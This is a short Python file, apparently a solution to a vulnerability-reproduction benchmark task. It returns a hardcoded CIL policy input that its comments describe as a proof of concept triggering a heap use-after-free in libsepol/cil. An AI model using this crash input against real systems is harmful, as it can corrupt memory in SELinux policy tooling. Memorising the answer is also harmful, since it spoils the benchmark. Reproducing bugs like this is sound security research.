import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct minimal PoC to trigger heap use-after-free in libsepol/cil
        # Creates anonymous classpermission in macro with classpermissionset
        poc = b"""(class c (p))
(classpermissionset s (c (p)) (classpermission (c (p))))
(block b
  (classpermission (c (p)))
  (classpermissionset s (c (p)) (classpermission (c (p))))
  (macro m () (classpermissionset s (c (p)) (classpermission (c (p)))))
  (m)
)
"""
        return poc